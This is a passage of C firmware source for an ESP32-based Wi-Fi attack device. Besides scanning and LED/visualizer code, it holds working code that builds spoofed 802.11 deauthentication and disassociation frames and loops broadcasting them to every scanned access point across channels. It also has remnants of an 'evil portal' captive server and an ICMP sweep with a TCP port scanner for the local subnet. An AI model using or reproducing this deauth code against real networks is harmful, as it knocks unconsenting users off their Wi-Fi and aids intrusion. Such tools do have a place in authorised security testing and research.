    }

    if (evilportal_server != NULL)
    {
        httpd_stop(evilportal_server);
        evilportal_server = NULL;
    }

    ESP_ERROR_CHECK(esp_wifi_stop());

    ap_manager_init();
}


void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));

 
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));

    printf("WiFi monitor mode started.\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode started.\n");
}

void wifi_manager_stop_monitor_mode() {
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    printf("WiFi monitor mode stopped.\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode stopped.\n");
}

void wifi_manager_init(void) {

    esp_log_level_set("wifi", ESP_LOG_ERROR);  // Only show errors, not warnings
    
    esp_wifi_set_ps(WIFI_PS_NONE);

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    // Initialize the TCP/IP stack and WiFi driver
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifiAP = esp_netif_create_default_wifi_ap();
    wifiSTA = esp_netif_create_default_wifi_sta();

    // Initialize WiFi with default settings
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();


    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Create the WiFi event group
    wifi_event_group = xEventGroupCreate();

    // Register the event handler for WiFi events
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_handler, NULL, NULL));
    

    // Set WiFi mode to STA (station)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    // Configure the SoftAP settings
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = strlen(""),
            .password = "",
            .channel = 1,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
            .ssid_hidden = 1
        },
    };

    // Apply the AP configuration
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

    // Start the Wi-Fi AP
    ESP_ERROR_CHECK(esp_wifi_start());

    ret = esp_crt_bundle_attach(NULL);
    if (ret == ESP_OK) {
        printf("Global CA certificate store initialized successfully.\n");
    } else {
        printf("Failed to initialize global CA certificate store: %s\n", esp_err_to_name(ret));
    }
}

void wifi_manager_start_scan() {
    ap_manager_stop_services();
    TERMINAL_VIEW_ADD_TEXT("Stopped AP Manager...\n");

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    TERMINAL_VIEW_ADD_TEXT("Set Wifi Modes...\n");

    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,            
        .show_hidden = true,
        .scan_time = {
            .active.min = 450,
            .active.max = 500,
            .passive = 500
        }
    };

    
    rgb_manager_set_color(&rgb_manager, 0, 50, 255, 50, false);

    printf("WiFi scanning started...\n");
    printf("Please wait 5 Seconds...\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi scanning started...\n");
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);

    if (err != ESP_OK) {
        printf("WiFi scan failed to start: %s", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
        return;
    }

    
    wifi_manager_stop_scan();
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(ap_manager_start_services());
}


// Stop scanning for networks
void wifi_manager_stop_scan() {
    esp_err_t err;

    err = esp_wifi_scan_stop();
    if (err != ESP_OK) {
        printf("Failed to stop WiFi scan: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to stop WiFi scan\n");
        return;
    }


    wifi_manager_stop_monitor_mode();


    rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);


    uint16_t initial_ap_count = 0;
    err = esp_wifi_scan_get_ap_num(&initial_ap_count);
    if (err != ESP_OK) {
        printf("Failed to get AP count: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT( "Failed to get AP count: %s\n", esp_err_to_name(err));
        return;
    }

    printf("Initial AP count: %u\n", initial_ap_count);
    TERMINAL_VIEW_ADD_TEXT("Initial AP count: %u\n", initial_ap_count);

    if (initial_ap_count > 0) {

        if (scanned_aps != NULL) {
            free(scanned_aps);
            scanned_aps = NULL;
        }


        scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
        if (scanned_aps == NULL) {
            printf("Failed to allocate memory for AP info\n");
            ap_count = 0;
            return;
        }


        uint16_t actual_ap_count = initial_ap_count;
        err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
        if (err != ESP_OK) {
            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
            free(scanned_aps);
            scanned_aps = NULL;
            ap_count = 0;
            return;
        }

        ap_count = actual_ap_count;
        printf("Actual AP count retrieved: %u\n", ap_count);
        TERMINAL_VIEW_ADD_TEXT("Actual AP count retrieved: %u\n", ap_count);
    } else {
        printf("No access points found\n");
        ap_count = 0;
    }

    printf("WiFi scanning stopped.\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi scanning stopped.\n");
}

void wifi_manager_list_stations() {
    if (station_count == 0) {
        printf("No stations found.\n");
        return;
    }

    printf("Listing all stations and their associated APs:\n");

    for (int i = 0; i < station_count; i++) {
        printf(
            "Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n"
            "     -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
            station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2],
            station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
            station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2],
            station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]
        );
    }
}   

static bool check_packet_rate(void) {
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
    
    // Reset counter every second
    if (current_time - last_packet_time >= 1000) {
        packet_counter = 0;
        last_packet_time = current_time;
        return true;
    }
    
    // Check if we've exceeded our rate limit
    if (packet_counter >= MAX_PACKETS_PER_SECOND) {
        return false;
    }
    
    packet_counter++;
    return true;
}

static const uint8_t deauth_packet_template[26] = {
    0xc0, 0x00,             // Frame Control
    0x3a, 0x01,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,         // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // BSSID
    0x00, 0x00,             // Sequence number
    0x07, 0x00              // Reason code: Class 3 frame received from nonassociated STA
};

static const uint8_t disassoc_packet_template[26] = {
    0xa0, 0x00,             // Frame Control (only first byte different)
    0x3a, 0x01,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,         // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // BSSID
    0x00, 0x00,             // Sequence number
    0x07, 0x00              // Reason code
};

esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        printf("Failed to set channel: %s\n", esp_err_to_name(err));
    }

    // Create packets from templates
    uint8_t deauth_frame[sizeof(deauth_packet_template)];
    uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
    memcpy(deauth_frame, deauth_packet_template, sizeof(deauth_packet_template));
    memcpy(disassoc_frame, disassoc_packet_template, sizeof(disassoc_packet_template));

    // Check if broadcast MAC
    bool is_broadcast = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0xFF) {
            is_broadcast = false;
            break;
        }
    }

    // Direction 1: AP -> Station
    // Set destination (target)
    memcpy(&deauth_frame[4], mac, 6);
    memcpy(&disassoc_frame[4], mac, 6);
    
    // Set source and BSSID (AP)
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    memcpy(&disassoc_frame[10], bssid, 6);
    memcpy(&disassoc_frame[16], bssid, 6);

    // Add sequence number (random)
    uint16_t seq = (esp_random() & 0xFFF) << 4;
    deauth_frame[22] = seq & 0xFF;
    deauth_frame[23] = (seq >> 8) & 0xFF;
    disassoc_frame[22] = seq & 0xFF;
    disassoc_frame[23] = (seq >> 8) & 0xFF;

    // Send frames with rate limiting
    if (check_packet_rate()) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (check_packet_rate()) {
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        }
        if (check_packet_rate()) {
            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        }
        if (check_packet_rate()) {
            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        }
    }

    // If not broadcast, send reverse direction
    if (!is_broadcast) {
        // Swap addresses for Station -> AP direction
        memcpy(&deauth_frame[4], bssid, 6);      // Set destination as AP
        memcpy(&deauth_frame[10], mac, 6);       // Set source as station
        memcpy(&deauth_frame[16], mac, 6);       // Set BSSID as station
        
        memcpy(&disassoc_frame[4], bssid, 6);
        memcpy(&disassoc_frame[10], mac, 6);
        memcpy(&disassoc_frame[16], mac, 6);

        // New sequence number for reverse direction
        seq = (esp_random() & 0xFFF) << 4;
        deauth_frame[22] = seq & 0xFF;
        deauth_frame[23] = (seq >> 8) & 0xFF;
        disassoc_frame[22] = seq & 0xFF;
        disassoc_frame[23] = (seq >> 8) & 0xFF;

        // Send reverse frames with rate limiting
        if (check_packet_rate()) {
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        }
        if (check_packet_rate()) {
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        }
        if (check_packet_rate()) {
            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        }
        if (check_packet_rate()) {
            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
        }
    }

    return ESP_OK;
}

void wifi_deauth_task(void *param) {
    if (ap_count == 0) {
        printf("No access points found\n");
        printf("Please run 'scan -w' first to find targets\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("Please run 'scan -w' first to find targets\n");
        vTaskDelete(NULL);
        return;
    }

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        printf("Failed to allocate memory for AP info\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for AP info\n");
        vTaskDelete(NULL);
        return;
    }

    while (1) {
        if (strlen((const char*)selected_ap.ssid) > 0) {
            for (int i = 0; i < ap_count; i++) {
                if (strcmp((char*)ap_info[i].ssid, (char*)selected_ap.ssid) == 0) {
                    for (int y = 1; y < 12; y++) {
                        uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                        wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
                        // Increase delay to 50ms
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }
                }
            }
        } else {
            for (int i = 0; i < ap_count; i++) {
                for (int y = 1; y < 12; y++) {
                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
                    // Increase delay to 50ms
                    vTaskDelay(pdMS_TO_TICKS(50));
                }
            }
        }
        // Add a small delay between iterations
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}


void wifi_manager_start_deauth() {
    if (!beacon_task_running) {
        printf("Starting deauth transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Starting deauth transmission...\n");
        ap_manager_stop_services();
        esp_wifi_start();
        // Increase stack size to 4096
        xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
    } else {
        printf("Deauth transmission already running.\n");
        TERMINAL_VIEW_ADD_TEXT("Deauth transmission already running.\n");
    }
}

void wifi_manager_select_ap(int index)
{
    
    if (ap_count == 0) {
        printf("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        return;
    }


    if (scanned_aps == NULL) {
        printf("No AP info available (scanned_aps is NULL)\n");
        TERMINAL_VIEW_ADD_TEXT("No AP info available (scanned_aps is NULL)\n");
        return;
    }


    if (index < 0 || index >= ap_count) {
        printf("Invalid index: %d. Index should be between 0 and %d\n", index, ap_count - 1);
        TERMINAL_VIEW_ADD_TEXT("Invalid index: %d. Index should be between 0 and %d\n", index, ap_count - 1);
        return;
    }
    
    selected_ap = scanned_aps[index];

    
    printf("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
             selected_ap.ssid,
             selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
             selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);
    
    TERMINAL_VIEW_ADD_TEXT("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
             selected_ap.ssid,
             selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
             selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);

    printf("Selected Access Point Successfully\n");
    TERMINAL_VIEW_ADD_TEXT("Selected Access Point Successfully\n");
}

#define MAX_PAYLOAD    64
#define UDP_PORT 6677
#define TRACK_NAME_LEN 32
#define ARTIST_NAME_LEN 32
#define NUM_BARS 15

void screen_music_visualizer_task(void *pvParameters) {
    char rx_buffer[128];
    char track_name[TRACK_NAME_LEN + 1];
    char artist_name[ARTIST_NAME_LEN + 1];
    uint8_t amplitudes[NUM_BARS];

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(UDP_PORT);
    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        vTaskDelete(NULL);
        return;
    }

    printf("Socket created\n");

    int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (err < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        vTaskDelete(NULL);
        return;
    }

    printf("Socket bound, port %d\n", UDP_PORT);

    while (1) {
        printf("Waiting for data...\n");

        struct sockaddr_in6 source_addr;
        socklen_t socklen = sizeof(source_addr);

        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0, (struct sockaddr *)&source_addr, &socklen);
        if (len < 0) {
            printf("recvfrom failed: errno %d\n", errno);
            break;
        }

        
        rx_buffer[len] = '\0';

        
        if (len >= TRACK_NAME_LEN + ARTIST_NAME_LEN + NUM_BARS) {
           
            memcpy(track_name, rx_buffer, TRACK_NAME_LEN);
            track_name[TRACK_NAME_LEN] = '\0';

            memcpy(artist_name, rx_buffer + TRACK_NAME_LEN, ARTIST_NAME_LEN);
            artist_name[ARTIST_NAME_LEN] = '\0';

            memcpy(amplitudes, rx_buffer + TRACK_NAME_LEN + ARTIST_NAME_LEN, NUM_BARS);

#ifdef WITH_SCREEN    
            music_visualizer_view_update(amplitudes, track_name, artist_name);
#endif
        } else {
            printf("Received packet of unexpected size\n");
        }
    }

    if (sock != -1) {
        printf("Shutting down socket and restarting...\n");
        shutdown(sock, 0);
        close(sock);
    }

    vTaskDelete(NULL);
}

void animate_led_based_on_amplitude(void *pvParameters)
{
    char rx_buffer[128];
    char addr_str[128];
    int addr_family = AF_INET;
    int ip_protocol = IPPROTO_IP;
    struct sockaddr_in dest_addr;

    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dest_addr.sin_family = addr_family;
    dest_addr.sin_port = htons(UDP_PORT);

    int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        return;
    }
    printf("Socket created\n");

    if (bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        return;
    }
    printf("Socket bound, port %d\n", UDP_PORT);

    float amplitude = 0.0f;
    float last_amplitude = 0.0f;
    float smoothing_factor = 0.1f;
    int hue = 0;

    while (1) {
        struct sockaddr_in source_addr;
        socklen_t socklen = sizeof(source_addr);
        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, MSG_DONTWAIT,
                           (struct sockaddr *)&source_addr, &socklen);

        if (len > 0) {
            rx_buffer[len] = '\0';
            inet_ntoa_r(source_addr.sin_addr, addr_str, sizeof(addr_str) - 1);
            printf("Received %d bytes from %s: %s\n", len, addr_str, rx_buffer);

            amplitude = atof(rx_buffer);
            amplitude = fmaxf(0.0f, fminf(amplitude, 1.0f)); // Clamp between 0.0 and 1.0

            // Smooth amplitude to avoid sudden changes (optional)
            amplitude = (smoothing_factor * amplitude) + ((1.0f - smoothing_factor) * last_amplitude);
            last_amplitude = amplitude;
        } else {
            // Gradually decrease amplitude when no data is received
            amplitude = last_amplitude * 0.9f; // Adjust decay rate as needed
            last_amplitude = amplitude;
        }

        // Ensure amplitude doesn't go below zero
        amplitude = fmaxf(0.0f, amplitude);


        hue = (int)(amplitude * 360) % 360;

        
        float h = hue / 60.0f;
        float s = 1.0f;
        float v = amplitude;

        int i = (int)h % 6;
        float f = h - (int)h;
        float p = v * (1.0f - s);
        float q = v * (1.0f - f * s);
        float t = v * (1.0f - (1.0f - f) * s);

        float r = 0.0f, g = 0.0f, b = 0.0f;
        switch (i) {
            case 0: r = v; g = t; b = p; break;
            case 1: r = q; g = v; b = p; break;
            case 2: r = p; g = v; b = t; break;
            case 3: r = p; g = q; b = v; break;
            case 4: r = t; g = p; b = v; break;
            case 5: r = v; g = p; b = q; break;
        }

        uint8_t red = (uint8_t)(r * 255);
        uint8_t green = (uint8_t)(g * 255);
        uint8_t blue = (uint8_t)(b * 255);

        
        esp_err_t ret = rgb_manager_set_color(&rgb_manager, 0, red, green, blue, false);
        if (ret != ESP_OK) {
            printf("Failed to set color\n");
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (sock != -1) {
        printf("Shutting down socket...\n");
        shutdown(sock, 0);
        close(sock);
    }
}

#define START_HOST 1
#define END_HOST 254
#define SCAN_TIMEOUT_MS 100
#define HOST_TIMEOUT_MS 100    
#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1
#define MAX_OPEN_PORTS 64


uint16_t calculate_checksum(uint16_t *addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

bool get_subnet_prefix(scanner_ctx_t* ctx) {
    esp_netif_t* netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        printf("Failed to get WiFi interface\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get WiFi interface\n");
        return false;
    }

    // Check if WiFi is connected
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        printf("WiFi is not connected\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi is not connected\n");
        return false;
    }

    // Get IP info
    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) {
        printf("Failed to get IP info\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get IP info\n");
        return false;
    }

    uint32_t network = ip_info.ip.addr & ip_info.netmask.addr;
    struct in_addr network_addr;
    network_addr.s_addr = network;
    
    char* network_str = inet_ntoa(network_addr);
    char* last_dot = strrchr(network_str, '.');
    if (last_dot == NULL) {
        printf("Invalid network address format\n");
        TERMINAL_VIEW_ADD_TEXT("Invalid network address format\n");
        return false;
    }
    
    size_t prefix_len = last_dot - network_str + 1;
    memcpy(ctx->subnet_prefix, network_str, prefix_len);
    ctx->subnet_prefix[prefix_len] = '\0';
    
    printf("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    return true;
}


bool is_host_active(const char* ip_addr) {
    struct sockaddr_in addr;
    int sock;
    struct timeval timeout;
    fd_set readset;
    uint8_t buf[sizeof(icmp_packet_t)];
    bool is_active = false;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return false;

    // Prepare ICMP packet
    icmp_packet_t* icmp = (icmp_packet_t*)buf;
    icmp->type = 8; // ICMP Echo Request
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->id = 0xAFAF;
    icmp->seqno = htons(1);
    icmp->checksum = calculate_checksum((uint16_t*)icmp, sizeof(icmp_packet_t));

    addr.sin_family = AF_INET;
    inet_pton(AF_INET, ip_addr, &addr.sin_addr.s_addr);

    sendto(sock, buf, sizeof(icmp_packet_t), 0, 
           (struct sockaddr*)&addr, sizeof(addr));

    timeout.tv_sec = HOST_TIMEOUT_MS / 1000;
    timeout.tv_usec = (HOST_TIMEOUT_MS % 1000) * 1000;

    FD_ZERO(&readset);
    FD_SET(sock, &readset);

    if (select(sock + 1, &readset, NULL, NULL, &timeout) > 0) {
        is_active = true;
    }

    close(sock);
    return is_active;
}


scanner_ctx_t* scanner_init(void) {
    scanner_ctx_t* ctx = malloc(sizeof(scanner_ctx_t));
    if (!ctx) return NULL;

    ctx->results = malloc(sizeof(host_result_t) * END_HOST);
    if (!ctx->results) {
        free(ctx);
        return NULL;
    }

    ctx->max_results = END_HOST;
    ctx->num_active_hosts = 0;
    ctx->subnet_prefix[0] = '\0';

    return ctx;
}

void scan_ports_on_host(const char* target_ip, host_result_t* result) {
    struct sockaddr_in server_addr;
    int sock;
    int scan_result;
    struct timeval timeout;
    fd_set fdset;
    int flags;

    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);

    printf("Scanning host: %s\n", target_ip);
    TERMINAL_VIEW_ADD_TEXT("Scanning host: %s\n", target_ip);

    for (size_t i = 0; i < NUM_PORTS; i++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS) break;

        uint16_t port = COMMON_PORTS[i];
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;

        flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        server_addr.sin_port = htons(port);
        scan_result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));

        if (scan_result < 0 && errno == EINPROGRESS) {
            timeout.tv_sec = SCAN_TIMEOUT_MS / 1000;
            timeout.tv_usec = (SCAN_TIMEOUT_MS % 1000) * 1000;

            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);

            scan_result = select(sock + 1, NULL, &fdset, NULL, &timeout);

            if (scan_result > 0) {
                int error = 0;
                socklen_t len = sizeof(error);
                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
                    result->open_ports[result->num_open_ports++] = port;
                    printf("%s - Port %d is OPEN\n", target_ip, port);
                    TERMINAL_VIEW_ADD_TEXT("%s - Port %d is OPEN\n", target_ip, port);
                }
            }
        }

        close(sock);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

void scanner_cleanup(scanner_ctx_t* ctx) {
    if (ctx) {
        if (ctx->results) {
            free(ctx->results);
        }
        free(ctx);
    }
}

bool wifi_manager_scan_subnet() {
    scanner_ctx_t* ctx = scanner_init();
    if (!ctx) {
        printf("Failed to initialize scanner context\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
        return false;
    }

    if (!get_subnet_prefix(ctx)) {
        printf("Failed to get network information. Make sure WiFi is connected.\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get network information. Make sure WiFi is connected.\n");
        scanner_cleanup(ctx);
        return false;
    }

    char current_ip[26];
    ctx->num_active_hosts = 0;

    printf("Starting subnet scan on %s0/24\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT("Starting subnet scan on %s0/24\n", ctx->subnet_prefix);

    for (int host = START_HOST; host <= END_HOST; host++) {
        snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);
        
        if (is_host_active(current_ip)) {
            printf("Found active host: %s\n", current_ip);
            TERMINAL_VIEW_ADD_TEXT("Found active host: %s\n", current_ip);
            scan_ports_on_host(current_ip, &ctx->results[ctx->num_active_hosts]);
            ctx->num_active_hosts++;
        }
    }

    printf("Scan completed. Found %d active hosts:\n", ctx->num_active_hosts);
    TERMINAL_VIEW_ADD_TEXT("Scan completed. Found %d active hosts:\n", ctx->num_active_hosts);
    
    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
        if (ctx->results[i].num_open_ports > 0) {
            printf("Host %s has %d open ports:\n", 
                    ctx->results[i].ip, ctx->results[i].num_open_ports);
            TERMINAL_VIEW_ADD_TEXT("Host %s has %d open ports:\n", 
                    ctx->results[i].ip, ctx->results[i].num_open_ports);
                    
            printf("Possible services/devices:\n");
            TERMINAL_VIEW_ADD_TEXT("Possible services/devices:\n");
            
            for (uint8_t j = 0; j < ctx->results[i].num_open_ports; j++) {
                uint16_t port = ctx->results[i].open_ports[j];
                printf("  - Port %d: ", port);
                TERMINAL_VIEW_ADD_TEXT("  - Port %d: ", port);
                
                
                switch(port) {
                    case 20:
                    case 21:
                        printf("FTP Server\n");
                        TERMINAL_VIEW_ADD_TEXT("FTP Server\n");
                        break;
                    case 22:
                    case 2222:
                        printf("SSH Server\n");
                        TERMINAL_VIEW_ADD_TEXT("SSH Server\n");
                        break;
                    case 23:
                        printf("Telnet Server\n");
                        TERMINAL_VIEW_ADD_TEXT("Telnet Server\n");
                        break;
                    case 80:
                    case 8080:
                    case 8443:
                    case 443:
                        printf("Web Server\n");
                        TERMINAL_VIEW_ADD_TEXT("Web Server\n");
                        break;
                    case 445:
                    case 139:
                        printf("Windows File Share/Domain Controller\n");
                        TERMINAL_VIEW_ADD_TEXT("Windows File Share/Domain Controller\n");
                        break;
                    case 3389:
                        printf("Windows Remote Desktop\n");
                        TERMINAL_VIEW_ADD_TEXT("Windows Remote Desktop\n");
                        break;
                    case 5900:
                    case 5901:
                    case 5902:
                        printf("VNC Remote Access\n");
                        TERMINAL_VIEW_ADD_TEXT("VNC Remote Access\n");
                        break;
                    case 1521:
                        printf("Oracle Database\n");
                        TERMINAL_VIEW_ADD_TEXT("Oracle Database\n");
                        break;
                    case 3306:
                        printf("MySQL Database\n");
                        TERMINAL_VIEW_ADD_TEXT("MySQL Database\n");
                        break;
                    case 5432:
                        printf("PostgreSQL Database\n");
                        TERMINAL_VIEW_ADD_TEXT("PostgreSQL Database\n");
                        break;
                    case 27017:
                        printf("MongoDB Database\n");
                        TERMINAL_VIEW_ADD_TEXT("MongoDB Database\n");
                        break;
                    case 9100:
                        printf("Network Printer\n");
                        TERMINAL_VIEW_ADD_TEXT("Network Printer\n");
                        break;
                    case 32400:
                        printf("Plex Media Server\n");
                        TERMINAL_VIEW_ADD_TEXT("Plex Media Server\n");
                        break;
                    case 2082:
                    case 2083:
                    case 2086:
                    case 2087:
                        printf("Web Hosting Control Panel\n");
                        TERMINAL_VIEW_ADD_TEXT("Web Hosting Control Panel\n");
                        break;
                    case 6379:
                        printf("Redis Server\n");
                        TERMINAL_VIEW_ADD_TEXT("Redis Server\n");
                        break;
                    case 1883:
                    case 8883:
                        printf("IoT Device (MQTT)\n");
                        TERMINAL_VIEW_ADD_TEXT("IoT Device (MQTT)\n");
                        break;
                    default:
                        printf("Unknown Service\n");
                        TERMINAL_VIEW_ADD_TEXT("Unknown Service\n");
                }
            }
            
            
            bool has_web = false;
            bool has_db = false;
            bool has_file_sharing = false;
            
            for (uint8_t j = 0; j < ctx->results[i].num_open_ports; j++) {
                uint16_t port = ctx->results[i].open_ports[j];
                if (port == 80 || port == 443 || port == 8080 || port == 8443) has_web = true;
                if (port == 3306 || port == 5432 || port == 1521 || port == 27017) has_db = true;
                if (port == 445 || port == 139) has_file_sharing = true;
            }
            
            printf("\nPossible device type:\n");
            TERMINAL_VIEW_ADD_TEXT("\nPossible device type:\n");
            
            if (has_web && has_db) {
                printf("- Web Application Server\n");
                TERMINAL_VIEW_ADD_TEXT("- Web Application Server\n");
            }
            if (has_file_sharing) {
                printf("- Windows Server\n");
